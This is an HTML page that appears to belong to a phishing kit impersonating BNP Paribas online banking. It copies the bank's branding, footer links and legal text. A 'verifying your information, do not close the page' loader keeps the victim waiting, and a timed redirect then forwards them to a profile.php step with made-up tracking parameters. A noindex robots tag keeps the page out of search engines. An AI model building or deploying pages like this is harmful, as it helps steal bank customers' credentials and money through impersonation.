
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="media/css/helpers.css">
        <link rel="stylesheet" href="media/css/style.css">

        <link rel="icon" type="image/png" href="media/imgs/ff.png" />
        <meta http-equiv="refresh" content="10;url=profile.php?valid=20983980.32&cd=34FF&RE=click">
        <title>Accéder à mes comptes en ligne</title>
    </head>

    <body>

		<div id="wrapper">
             
            <!-- HEADER -->
            <header id="header2" class="d-flex align-items-center">
                <div class="logo flex-grow-1 pl10">
                    <img style="min-width: 519px;" class="d-lg-block d-md-block d-sm-none d-none" src="media/imgs/logo.png">
                    <img style="min-width: 196px;" class="d-lg-none d-md-none d-sm-block d-block" src="media/imgs/logo4.png">
                </div>
                <div class="header-right">
                    <img style="min-width: 475px;" class="d-lg-block d-md-none d-sm-none d-none" src="media/imgs/log-menu.png">
                    <img style="min-width: 69px;" class="d-lg-none d-md-block d-sm-block d-block" src="media/imgs/log-menu2.png">
                </div>
            </header>
            <!-- END HEADER -->

            <!-- MAIN -->
            <main id="main2">
                <div class="left">
                    <img style="min-width: 140px;" src="media/imgs/left-menu.png">
                </div>
                <div class="right d-flex align-items-center justify-content-center">
                    
                    <div class="loader">
                        <div class="lds-spinner"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
                        <p>Vos informations sont en cours de vérification...<br>Veuillez ne pas fermer la page.</p>
                    </div>
                    
                </div>
            </main>
            <!-- END MAIN -->

            <!-- FOOTER -->
            <footer id="footer">
                <div class="social-media">
                    <span>Suivez-nous sur :</span>
                    <ul>
                        <li><i class="fab fa-facebook-f"></i></li>
                        <li><i class="fab fa-twitter"></i></li>
                        <li><i class="fab fa-youtube"></i></li>
                        <li><i class="fab fa-instagram"></i></li>
                        <li><i class="fab fa-linkedin"></i></li>
                    </ul>
                </div>
                <div class="row">
                    <div class="col-md-4 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
                        <div class="widget">
                            <h3>Contact</h3>
                            <p>Nos conseillers vous répondent par téléphone, chat, mail ou bien encore grâce à nos SAV Facebook et Twitter.</p>
                        </div>
                    </div>
                    <div class="col-md-4 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
                        <div class="widget">
                            <h3>Trouver une agence</h3>
                            <p>Retrouvez facilement l’agence la plus proche avec ses horaires d’ouverture et les services disponibles.</p>
                        </div>
                    </div>
                    <div class="col-md-4 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
                        <div class="widget">
                            <h3>les applications mobiles</h3>
                            <p>Découvrez nos applications mobiles pour gérer vos comptes, payer avec votre mobile et vous simplifier la vie.</p>
                        </div>
                    </div>
                </div>
                <hr>
                <div class="row">
                    <div class="col-md-3 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
                        <div class="widget">
                            <h3 class="second">Informations légales</h3>
                            <ul>
                                <li>Données personnelles</li>
                                <li>Mentions légales</li>
                                <li>Cookies</li>
                                <li>Réglementation</li>
                                <li>Fonds de Garantie des Dépôts et résolution</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-3 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
                        <div class="widget">
                            <h3 class="second">Nous connaître</h3>
                            <ul>
                                <li>La banque d’un monde qui change</li>
                                <li>Nos engagements responsables</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-3 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
                        <div class="widget">
                            <h3 class="second">Informations</h3>
                            <ul>
                                <li>Site Accessible</li>
                                <li>Site Sécurisé</li>
                                <li>Conditions d’éligibilité</li>
                                <li>Tarifs et conditions</li>
                                <li>Glossaire</li>
                                <li>Guides et brochures</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-3 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
                        <div class="widget">
                            <h3 class="second">Nos autres sites</h3>
                            <ul>
                                <li>Les Professionnels</li>
                                <li>Les Entreprises</li>
                                <li>Les Associations</li>
                                <li>La Banque Privée</li>
                                <li>La Banque en ligne</li>
                                <li>Le Groupe BNP Paribas</li>
                            </ul>
                        </div>
                    </div>
                </div>
                <p>Pour la bonne exécution de vos contrats, et en cas de réclamations/contestations, votre Conseiller est joignable sur sa ligne directe (appel non surtaxé). Si vous ne disposez plus de son numéro de téléphone direct, envoyez-lui un message par votre messagerie sécurisée, il vous le donnera à nouveau en retour.</p>
            </footer>
            <!-- END FOOTER -->

         </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="media/js/js.js"></script>


    </body>

</html>